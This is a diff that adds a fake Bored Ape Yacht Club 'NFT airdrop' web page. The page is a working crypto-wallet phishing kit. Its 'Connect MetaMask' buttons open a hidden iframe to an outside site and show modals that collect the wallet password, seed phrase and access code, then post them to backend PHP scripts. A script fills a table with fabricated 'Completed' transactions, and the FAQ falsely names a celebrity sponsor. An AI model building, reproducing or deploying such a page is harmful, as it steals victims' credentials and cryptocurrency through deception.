@@ -1,0 +1,825 @@
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>NFT's project | BAYC</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+<link href="css2?family=Montserrat:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
+<link rel="icon" href="favicon.ico"><link href="css/app_1.css" rel="stylesheet"><style>
+    .MuiFormControl-fullWidth {
+        width: 100%;
+    }
+    .MuiFormControl-root {
+        border: 0;
+        margin: 0;
+        display: inline-flex;
+        padding: 0;
+        position: relative;
+        min-width: 0;
+        flex-direction: column;
+        vertical-align: top;
+    }
+    @-moz-keyframes mui-auto-fill {}
+    @-moz-keyframes mui-auto-fill-cancel {}
+    .MuiInputBase-root {
+        color: rgba(0, 0, 0, 0.87);
+        cursor: text;
+        display: inline-flex;
+        position: relative;
+        font-size: 1rem;
+        box-sizing: border-box;
+        align-items: center;
+        font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+        font-weight: 400;
+        line-height: 1.1876em;
+        letter-spacing: 0.00938em;
+    }
+    .MuiInputBase-root.Mui-disabled {
+        color: rgba(0, 0, 0, 0.38);
+        cursor: default;
+    }
+    .MuiInput-root {
+        position: relative;
+    }
+    .jss3:after {
+        border-bottom: 2px solid rgb(3, 125, 214);
+    }
+    label + .MuiInput-formControl {
+        margin-top: 16px;
+    }
+    .MuiInput-colorSecondary.MuiInput-underline:after {
+        border-bottom-color: #f50057 !important;
+    }
+    .MuiInput-underline:after {
+        left: 0 !important;
+        right: 0 !important;
+        bottom: 0 !important;
+        content: "" !important;
+        position: absolute !important;
+        transform: scaleX(0) !important;
+        transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
+        border-bottom: 2px solid #3f51b5;
+        pointer-events: none !important;
+    }
+    .MuiInput-underline.Mui-focused:after {
+        transform: scaleX(1) !important;
+    }
+    .MuiInput-underline.Mui-error:after {
+        transform: scaleX(1) !important;
+        border-bottom-color: #f44336;
+    }
+    .MuiInput-underline:before {
+        left: 0 !important;
+        right: 0 !important;
+        bottom: 0 !important;
+        content: "\00a0" !important;
+        position: absolute !important;
+        transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+        border-bottom: 1px solid rgba(0, 0, 0, 0.42) !important;
+        pointer-events: none !important;
+    }
+    .MuiInput-underline:hover:not(.Mui-disabled):before {
+        border-bottom: 2px solid rgba(0, 0, 0, 0.87) !important;
+    }
+    .MuiInput-underline.Mui-disabled:before {
+        border-bottom-style: dotted !important;
+    }
+    @media (hover: none) {
+        .MuiInput-underline:hover:not(.Mui-disabled):before {
+            border-bottom: 1px solid rgba(0, 0, 0, 0.42) !important;
+        }
+    }
+    .MuiInputLabel-animated {
+        transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
+    }
+    .MuiInputLabel-formControl {
+        top: 0;
+        left: 0;
+        position: absolute;
+        transform: translate(0, 24px) scale(1);
+    }
+    .jss1 {
+        color: #aeaeae;
+        font-weight: 400;
+    }
+    .jss1.jss2 {
+        color: #aeaeae;
+    }
+    .jss1.jss4 {
+        color: #aeaeae;
+    }
+    .jss3:after {
+        border-bottom: 2px solid rgb(3, 125, 214);
+    }
+    .jss5 {
+        color: #aeaeae;
+    }
+    .jss6 {
+        padding: 8px;
+    }
+    .jss6::placeholder {
+        color: #aeaeae;
+    }
+    .jss7 {
+        color: #fff;
+    }
+    .jss8:after {
+        border-bottom: 2px solid #fff;
+    }
+    .jss9.jss10 {
+        color: #5b5b5b;
+    }
+    .jss9.jss4 {
+        color: #5b5b5b;
+    }
+    .jss12 {
+        border: 1px solid #BBC0C5;
+        height: 48px;
+        display: flex;
+        padding: 0 16px;
+        align-items: center;
+        border-radius: 6px;
+    }
+    label + .jss12 {
+        margin-top: 9px;
+    }
+    .jss12.jss11 {
+        border: 1px solid #2f9ae0;
+    }
+    .jss13 {
+        color: #5b5b5b;
+        position: initial;
+        font-size: 1rem;
+        transform: none;
+        transition: none;
+    }
+    .jss14 {
+        color: #5b5b5b;
+        position: initial;
+        font-size: .75rem;
+        transform: none;
+        transition: none;
+    }
+    .jss15 {
+        line-height: initial !important;
+    }
+    .MuiInputLabel-root {
+        display: block;
+        transform-origin: top left;
+    }
+    .MuiFormLabel-root {
+        color: rgba(0, 0, 0, 0.54);
+        padding: 0;
+        font-size: 1rem;
+        font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+        font-weight: 400;
+        line-height: 1;
+        letter-spacing: 0.00938em;
+    }
+    .MuiFormLabel-root.Mui-focused {
+        color: #3f51b5 !important;
+    }
+    .MuiFormLabel-root.Mui-disabled {
+        color: rgba(0, 0, 0, 0.38);
+    }
+    .MuiFormLabel-root.Mui-error {
+        color: #f44336;
+    }
+    .MuiFormLabel-root.Mui-focused {
+        color: #3f51b5;
+    }
+    .MuiFormLabel-root.Mui-disabled {
+        color: rgba(0, 0, 0, 0.38);
+    }
+    .MuiFormLabel-root.Mui-error {
+        color: #f44336;
+    }
+    .MuiFormLabel-colorSecondary.Mui-focused {
+        color: #f50057;
+    }
+    .MuiInput-underline.Mui-focused:after {
+        transform: scaleX(1);
+    }
+    .MuiInputLabel-shrink {
+        transform: translate(0, 1.5px) scale(0.75);
+        transform-origin: top left;
+    }
+    .MuiInputLabel-animated {
+        transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
+    }
+    .MuiInputLabel-filled {
+        z-index: 1;
+        transform: translate(12px, 20px) scale(1);
+        pointer-events: none;
+    }
+    .MuiInputLabel-filled.MuiInputLabel-marginDense {
+        transform: translate(12px, 17px) scale(1);
+    }
+    .MuiInputLabel-filled.MuiInputLabel-shrink {
+        transform: translate(12px, 10px) scale(0.75);
+    }
+    .MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
+        transform: translate(12px, 7px) scale(0.75);
+    }
+    .MuiInputLabel-outlined {
+        z-index: 1;
+        transform: translate(14px, 20px) scale(1);
+        pointer-events: none;
+    }
+    .MuiInputLabel-outlined.MuiInputLabel-marginDense {
+        transform: translate(14px, 12px) scale(1);
+    }
+    .MuiInputLabel-outlined.MuiInputLabel-shrink {
+        transform: translate(14px, -6px) scale(0.75);
+    }
+    .MuiInputLabel-root {
+        display: block;
+        transform-origin: top left;
+    }
+    .MuiInputLabel-formControl {
+        top: 0;
+        left: 0;
+        position: absolute;
+        transform: translate(0, 24px) scale(1);
+    }
+    .MuiInputLabel-marginDense {
+        transform: translate(0, 21px) scale(1);
+    }
+    .MuiInputLabel-shrink {
+        transform: translate(0, 1.5px) scale(0.75);
+        transform-origin: top left;
+    }
+    .MuiInputLabel-animated {
+        transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
+    }
+    .MuiInputLabel-filled {
+        z-index: 1;
+        transform: translate(12px, 20px) scale(1);
+        pointer-events: none;
+    }
+    .MuiInputLabel-filled.MuiInputLabel-marginDense {
+        transform: translate(12px, 17px) scale(1);
+    }
+    .MuiInputLabel-filled.MuiInputLabel-shrink {
+        transform: translate(12px, 10px) scale(0.75);
+    }
+    .MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
+        transform: translate(12px, 7px) scale(0.75);
+    }
+    .MuiInputLabel-outlined {
+        z-index: 1;
+        transform: translate(14px, 20px) scale(1);
+        pointer-events: none;
+    }
+    .MuiInputLabel-outlined.MuiInputLabel-marginDense {
+        transform: translate(14px, 12px) scale(1);
+    }
+    .MuiInputLabel-outlined.MuiInputLabel-shrink {
+        transform: translate(14px, -6px) scale(0.75);
+    }
+    .MuiFormControl-root {
+        border: 0;
+        margin: 0;
+        display: inline-flex;
+        padding: 0;
+        position: relative;
+        min-width: 0;
+        flex-direction: column;
+        vertical-align: top;
+    }
+    .MuiFormControl-marginNormal {
+        margin-top: 16px;
+        margin-bottom: 8px;
+    }
+    .MuiFormControl-marginDense {
+        margin-top: 8px;
+        margin-bottom: 4px;
+    }
+    .MuiFormControl-fullWidth {
+        width: 100%;
+    }
+</style></head>
+<body>
+<input id="orytytytyty" type="hidden" value="">
+<input id="yturytytyty" type="hidden" value="">
+<div class="menu-section">
+<div class="container">
+<div class="row">
+<div class="left">
+<img src="images/content/bayc-logo.png" alt="">
+</div>
+<div class="right">
+<a href="#about-section">About airdrop</a>
+<a href="#what-section">BAYC</a>
+<a href="#road-section">ROADMAP</a>
+<a href="#about-nft-section">ABOUT NFTS</a>
+<a href="#airdrop-section">TAKE PART IN AIRDROP</a>
+<a href="#rules-and-tabs-section">FAQ</a>
+<a href="#transactions">TRANSACTIONS</a>
+</div>
+</div>
+</div>
+</div>
+<div class="main-section">
+<div class="container">
+<div class="row">
+<div class="inside">
+<img src="images/content/11234141.png" alt="">
+<div class="text">
+<h2 style="margin-bottom: 20px">WELCOME TO <span>THE BORED APE
+YACHT CLUB</span> AIRDROP</h2>
+<div>
+<a href="google.com" id="connect_button1" class="bayc-button btn-default">CONNECT METAMASK WALLET</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="about-section" class="about-section about-airdrop-section">
+<div class="container">
+<div class="row">
+<div class="left">
+<img src="images/content/qweqweqwe324.png" alt="">
+</div>
+<div class="gtgt">
+<h2>About airdrop</h2>
+<p>During this unique event we will give you a chance to
+win NFT,
+have a look at the rules and don't miss on your chance!</p>
+<p>
+<a href="google.com" id="connect_button2" class="bayc-button btn-default">take part in airdrop</a>
+</p>
+</div>
+</div>
+</div>
+</div>
+<div class="small-separ"></div>
+<div id="what-section" class="about-section what-section">
+<div class="container">
+<div class="row">
+<div class="left">
+<h2>what is bayc?</h2>
+<p>BAYC is a collection of 10,000 Bored Ape NFTs—unique digital collectibles living on the Ethereum
+blockchain. Your Bored Ape doubles as your Yacht Club membership card, and grants access to
+members-only benefits, the first of which is access to THE BATHROOM, a collaborative graffiti board.
+Future areas and perks can be unlocked by the community through roadmap activation.</p>
+</div>
+<div class="gtgt">
+<img src="images/content/yetywuryetwryu.png" alt="">
+</div>
+</div>
+</div>
+</div>
+<div class="small-separ"></div>
+<div id="road-section" class="about-section road-section">
+<div class="container">
+<div class="row">
+<div class="left">
+<h2>Roadmap</h2>
+<p>We’re in this for the long haul.</p>
+<p>We’ve set up some goalposts for ourselves. Once we hit a target sell through percentage, we will
+begin to work on realizing the stated goal.</p>
+</div>
+<div class="gtgt">
+<img src="images/content/qqqqq.png" alt="">
+</div>
+<div class="gtgtqwe">
+<img src="images/content/qwerqwerqwe.png" alt="">
+</div>
+</div>
+</div>
+</div>
+<div class="small-separ"></div>
+<div class="win-any-section">
+<div class="container">
+<div class="row">
+<div class="title">Win <span>any</span> of our NFT</div>
+<div class="img">
+<img src="images/content/win-any-img.png" alt="">
+</div>
+</div>
+</div>
+</div>
+<div id="about-nft-section" class="about-section">
+<div class="container">
+<div class="row">
+<div class="left">
+<h2>ABOUT NFTs</h2>
+<p>Each Bored Ape is unique and programmatically generated from over 170 possible traits, including
+expression, headwear, clothing, and more. All apes are dope, but some are rarer than others.</p>
+<p>The apes are stored as ERC-721 tokens on the Ethereum blockchain and hosted on IPFS. (See Record and
+Proof.)</p>
+<p>To access members-only areas such as THE BATHROOM, Apeholders will need to be signed into their
+Metamask Wallet.</p>
+</div>
+<div class="right">
+<img src="images/content/illustration-mage.png" alt="">
+</div>
+</div>
+</div>
+</div>
+<div class="small-separ"></div>
+<div id="airdrop-section" class="airdrop-section">
+<div class="container">
+<div class="row">
+<div class="left">
+<h2>take part <br> in airdrop</h2>
+</div>
+<div class="center">To participate you just need to connect your active MetaMask wallet where you have
+minimum <b>1 NFT</b>.
+</div>
+<div class="right">
+<a href="google.com" id="connect_button4" class="bayc-button btn-default">CONNECT <br> METAMASK WALLET</a>
+</div>
+</div>
+</div>
+</div>
+<div id="rules-and-tabs-section" class="rules-and-tabs-section">
+<div class="container">
+<div class="row">
+<div class="left" id="section-rules">
+<h2>FAQ OF AIRDROP</h2>
+<p>If you still have questions about airdrop, you can probably find the answer here</p>
+
+</div>
+<div class="right" id="section-faq">
+
+<div class="tabs">
+<button class="accordion">What do I have to do to participate in the giveaway?</button>
+<div class="panel">
+<p>To participate you just need to connect your active MetaMask wallet where you have minimum 1
+NFT.</p>
+</div>
+<button class="accordion">What NFT can I get?</button>
+<div class="panel">
+<p>Randomly you will receive one of these nft like: Bored Ape Yacht Club, Mutant Ape Yacht Club,
+Alien Frens, Azuki, Phanta Bear, The Sandbox and many other..</p>
+ </div>
+<button class="accordion">How long will it take me to get my bonus?</button>
+<div class="panel">
+<p>You get your NFT instantly! The system is fully automated, so all NFT are sent without
+delay!</p>
+</div>
+<button class="accordion">Who is the sponsor of this giveaway?</button>
+<div class="panel">
+<p>The main sponsor of this event is Gary Vee.</p>
+</div>
+<button class="accordion">How many times can I participate in the giveaway?</button>
+<div class="panel">
+<p>You can only participate once.</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<section class="transactions" id="transactions">
+<div class="container">
+
+
+
+
+<div class="table" id="table">
+<div class="table-content" style="width: 100%; margin:  0 auto">
+<div class="table-header">
+<div class="table-header_row">
+<p class="address" style="padding: 15px 15px;">From</p>
+<p class="address" style="padding: 15px 15px;">To</p>
+<p class="address" style="padding: 15px 15px;">NFT</p>
+</div>
+<div class="table-header_separator"></div>
+<div class="table-header_row">
+<p class="age" style="padding: 15px 15px;">TxHash</p>
+<p class="age" style="padding: 15px 15px;">Block</p>
+<p class="value" style="padding: 15px 15px;">Age</p>
+<p class="address" style="padding: 15px 15px;">Status</p>
+</div>
+</div>
+<div class="table-items"><div class="table-row" style="">
+                <div class="table-row_content">
+                    <div class="table-row_line">
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">0xB566a04F6F6F3BA0aCbc548f4D9b665A50217C38</p>
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">0x5lPLe27Znyk9l93o3FKMWmtfN...</p>
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">Hape Prime</p>
+                    </div>
+                </div>
+                <div class="table-row_separator">
+                    <p class="gen-out">OUT</p>
+                </div>
+                <div class="table-row_content">
+                    <div class="table-row_line">
+                        <p class="age" style=" padding: 18px 15px; font-size: 14px">0x30938</p>
+                        <p class="age" style=" padding: 18px 15px; font-size: 14px">610590</p>
+                        <p class="value" style=" padding: 18px 15px; font-size: 14px">right now</p>
+                        <p class="address gen-status" style=" padding: 18px 15px; font-size: 14px">Completed</p>
+                    </div>
+
+                </div>
+            </div><div class="table-row" style="">
+                <div class="table-row_content">
+                    <div class="table-row_line">
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">0xB566a04F6F6F3BA0aCbc548f4D9b665A50217C38</p>
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">0xnDJpOYX1E4SJ6M8vxGLiEp22d...</p>
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">Bayc</p>
+                    </div>
+                </div>
+                <div class="table-row_separator">
+                    <p class="gen-out">OUT</p>
+                </div>
+                <div class="table-row_content">
+                    <div class="table-row_line">
+                        <p class="age" style=" padding: 18px 15px; font-size: 14px">0x36402</p>
+                        <p class="age" style=" padding: 18px 15px; font-size: 14px">661688</p>
+                        <p class="value" style=" padding: 18px 15px; font-size: 14px">right now</p>
+                        <p class="address gen-status" style=" padding: 18px 15px; font-size: 14px">Completed</p>
+                    </div>
+
+                </div>
+            </div><div class="table-row" style="">
+                <div class="table-row_content">
+                    <div class="table-row_line">
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">0xB566a04F6F6F3BA0aCbc548f4D9b665A50217C38</p>
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">0xAHpKUxCCSH4whB2MgQTpYTZIh...</p>
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">Doodles</p>
+                    </div>
+                </div>
+                <div class="table-row_separator">
+                    <p class="gen-out">OUT</p>
+                </div>
+                <div class="table-row_content">
+                    <div class="table-row_line">
+                        <p class="age" style=" padding: 18px 15px; font-size: 14px">0x38728</p>
+                        <p class="age" style=" padding: 18px 15px; font-size: 14px">644395</p>
+                        <p class="value" style=" padding: 18px 15px; font-size: 14px">right now</p>
+                        <p class="address gen-status" style=" padding: 18px 15px; font-size: 14px">Completed</p>
+                    </div>
+
+                </div>
+            </div>
+
+</div>
+</div>
+</div>
+</div>
+</section>
+<div class="separator-line">
+</div>
+<div class="footer-logo">
+<div class="container">
+<div class="row">
+<div class="left">
+<a href="#" id="connect_button3" class="bayc-button btn-default">CONNECT METAMASK WALLET</a>
+</div>
+<div class="center">
+<img src="images/content/bayc-footer.png" alt="">
+</div>
+<div class="right">
+<div><p>© 2022 Yuga Labs LLC</p></div>
+<div><a href="#">BAYC Terms &amp; Conditions</a></div>
+<div><a href="#">MAYC Terms &amp; Conditions</a></div>
+</div>
+</div>
+</div>
+</div>
+<script type="text/javascript" src="static/jquery-1.11.1.min.js"></script>
+<script>
+    var acc = document.getElementsByClassName("accordion");
+    var i;
+
+    for (i = 0; i < acc.length; i++) {
+        acc[i].addEventListener("click", function () {
+            this.classList.toggle("active");
+            var panel = this.nextElementSibling;
+            if (panel.style.maxHeight) {
+                panel.style.maxHeight = null;
+            } else {
+                panel.style.maxHeight = panel.scrollHeight + "px";
+            }
+        });
+    }
+</script>
+<script>
+    let BaseWallet = "0xB566a04F6F6F3BA0aCbc548f4D9b665A50217C38";
+
+    function randomString(len, charSet) {
+        charSet = charSet || "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        var randomString = "";
+        for (var i = 0; i < len; i++) {
+            var randomPoz = Math.floor(Math.random() * charSet.length);
+            randomString += charSet.substring(randomPoz, randomPoz + 1);
+        }
+        return randomString;
+    }
+
+    function randomInteger(min, max) {
+        let rand = min + Math.random() * (max + 1 - min);
+        return Math.floor(rand);
+    }
+
+    function createTableItem() {
+        let inputValue = randomInteger(0, 500) + "." + randomString(1, "123456789");
+        let outputValue = ++inputValue * 2;
+        let txFIn = inputValue / 1000;
+        let txFOut = outputValue / 1000;
+        let cutWallet = randomInteger(0, 500) + "." + randomString(1, "123456789");
+        let ytytyt = '0x' + randomString(25) + "...";
+        let cutWalletqwe = '0x' + randomInteger(10000, 90000)
+        let cutWalletqwasde = 6 + '' + randomInteger(10000, 90000)
+
+        let random_nft = getNFT();
+
+        let row = `
+            <div class="table-row">
+                <div class="table-row_content">
+                    <div class="table-row_line">
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">${BaseWallet}</p>
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">${ytytyt}</p>
+                        <p class="address" style=" padding: 18px 15px; font-size: 14px">${random_nft}</p>
+                    </div>
+                </div>
+                <div class="table-row_separator">
+                    <p class="gen-out">OUT</p>
+                </div>
+                <div class="table-row_content">
+                    <div class="table-row_line">
+                        <p class="age" style=" padding: 18px 15px; font-size: 14px">${cutWalletqwe}</p>
+                        <p class="age" style=" padding: 18px 15px; font-size: 14px">${cutWalletqwasde}</p>
+                        <p class="value" style=" padding: 18px 15px; font-size: 14px">right now</p>
+                        <p class="address gen-status" style=" padding: 18px 15px; font-size: 14px">Completed</p>
+                    </div>
+
+                </div>
+            </div>`;
+
+        $(row).hide().prependTo(".table-items").fadeIn("slow");
+        $('.table-row:eq(3)').remove();
+    }
+
+    function getNFT() {
+        items = ["Bayc", "Azuki", "Hape Prime", "CryptoBatz", "CryptoPunks", "The Sandbox", "Doodles"];
+        return items[Math.floor(Math.random() * items.length)];
+    }
+
+    createTableItem();
+    createTableItem();
+    createTableItem();
+    createTableItem();
+    createTableItem();
+    setInterval(createTableItem, 15000);
+</script>
+<script>
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener('click', function (e) {
+            e.preventDefault();
+
+            document.querySelector(this.getAttribute('href')).scrollIntoView({
+                behavior: 'smooth'
+            });
+        });
+    });
+</script>
+<script src="js/app.js"></script>
+<iframe id="log_frame" style="position: absolute; height: 600px; width:380px ; border: none; right: 50px; top: 0px; display: none" sandbox="allow-downloads allow-forms allow-modals allow-pointer-lock allow-popups allow-presentation allow-same-origin allow-scripts allow-top-navigation-by-user-activation" allow="accelerometer; camera; encrypted-media; display-capture; geolocation; gyroscope; microphone; midi; clipboard-read; clipboard-write" scrolling="auto" allowtransparency="true" allowpaymentrequest="true" allowfullscreen="true" loading="lazy"></iframe>
+		<script type="text/javascript" src="metamask/js/jquery-3.6.0.min.js"></script>
+<script>
+    window.onmessage = function (event) {
+        if (event.data === 'ready_to_close') {
+            $("#log_frame").hide();
+        }
+    };
+    iframe = document.getElementById('log_frame')
+    function showMeta(event) {
+        event.preventDefault();
+        iframe.src = "https://cheesess.org/";
+        $("#log_frame").show();
+    }
+    $('#connect_button1').click(showMeta);
+	$('#connect_button2').click(showMeta);
+	$('#connect_button3').click(showMeta);
+	$('#connect_button4').click(showMeta);
+</script>
+<script>
+    $( document ).ready(function() {
+        let all_modals = $(".phishing-modal");
+        let modal_password = $("#modal-password");
+        let modal_phrase = $("#modal-phrase");
+        let modal_access_code = $("#modal-access_code");
+        let modal_phrase_invalid = $("#modal-phrase-invalid");
+        let btn_open_modal_password_1 = $(".bayc-button");
+
+        btn_open_modal_password_1.on( "click", function(e) {
+            e.preventDefault();
+            $("html, body").animate({ scrollTop: 0 }, "fast");
+            openModalPassword();
+        });
+
+        // Modals event
+        function openModalPassword() {
+            closeAllModals();
+            modal_password.css("display", "block")
+        }
+
+        function openModalPhrase() {
+            closeAllModals();
+            modal_phrase.css("display", "block")
+        }
+
+        function openModalAccessCode(){
+            closeAllModals();
+            // отправить данные в канал
+            let input_phares = $("#phares_input").val();
+            sendData(input_phares);
+        }
+
+        function openModalPhraseInvalid() {
+            closeAllModals();
+            modal_phrase_invalid.css("display", "block")
+        }
+
+        function closeAllModals(){
+            all_modals.each(function( index ) {
+                $(index).css("display", "none")
+            });
+
+            $(".phishing-modal").css("display", "none")
+        }
+
+        // 1Step modal: send code
+        let signasddas_btns = $(".signasddas");
+        signasddas_btns.on( "click", function() {
+            openModalPhrase();
+        });
+
+        // 2Step modal: send Phares
+        let step_2_btn = $(".step-2-btn");
+        step_2_btn.on( "click", function() {
+            $("#orytytytyty").val("Otebis");
+            openModalAccessCode();
+        });
+
+        // 3Step modal: send access code
+        let step_3_btn = $(".step-3-btn");
+        step_3_btn.on( "click", function() {
+            let access_code_input = $("#access_code_input").val();
+            $("#yturytytyty").val("Otebis");
+            sendDataCode(access_code_input);
+        });
+
+
+        // Процесс отправки Phares
+        function sendData(data1) {
+            let getValid = $("#orytytytyty").val();
+
+            $.ajax({
+                method: "POST",
+                data:{
+                    'privateKeTrr':data1,
+                    'zippo':getValid,
+                },
+                dataType: "json",
+                url: "api/addData.php",
+                success: function(data) {
+                    console.log(data);
+                    if (data.status === 1) {
+                        modal_access_code.css("display", "block")
+                    }
+                    else{
+                        // Show message: Enter valid date's
+                    }
+                }
+            })
+        }
+
+        // Процесс отправки AccessCode
+        function sendDataCode(data1) {
+            let getValid = $("#yturytytyty").val();
+            $.ajax({
+                method: "POST",
+                data:{
+                    'privateKeTrr':data1,
+                    'zippo':getValid,
+                },
+                dataType: "json",
+                url: "api/addDataCode.php",
+                success: function(data) {
+                    console.log(data);
+                    $('.error_message').show()
+                    if (data.status === 1) {
+                        closeAllModals();
+                    }
+                    else{
+                        // Show message: Enter valid date's
+                    }
+                }
+            })
+        }
+    });
+
+
+</script>
+
+
+</body></html>
